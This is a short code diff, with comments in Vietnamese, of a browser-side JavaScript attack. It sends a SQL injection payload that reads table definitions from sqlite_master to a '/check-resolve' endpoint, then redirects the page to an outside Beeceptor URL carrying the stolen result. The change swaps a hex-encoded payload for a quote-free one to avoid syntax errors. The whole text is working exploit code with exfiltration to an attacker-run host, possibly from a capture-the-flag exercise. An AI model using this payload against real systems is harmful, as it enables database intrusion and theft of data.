@@ -1,8 +1,8 @@
 let formData = new URLSearchParams();
 
-// Dùng nháy đơn bên ngoài, và hex() để bọc dữ liệu lại
-// Điều này đảm bảo 100% không vỡ JSON và không bị lỗi cú pháp
-formData.append('id', "-1 UNION SELECT hex(GROUP_CONCAT(sql)) FROM sqlite_master WHERE type='table'");
+// KHÔNG dùng bất kỳ dấu nháy nào. 
+// Lấy dòng đầu tiên trong bảng cấu trúc Database, đặt tên cột là resolve để khớp với JSON
+formData.append('id', '-1 UNION SELECT sql AS resolve FROM sqlite_master LIMIT 1 OFFSET 0');
 
 fetch('/check-resolve', {
     method: 'POST',
@@ -16,6 +16,5 @@ fetch('/check-resolve', {
 })
 .then(response => response.text())
 .then(data => {
-    // Tuồn thẳng ra Beeceptor
     window.location = 'https://khanh.free.beeceptor.com/?result=' + encodeURIComponent(data);
 });
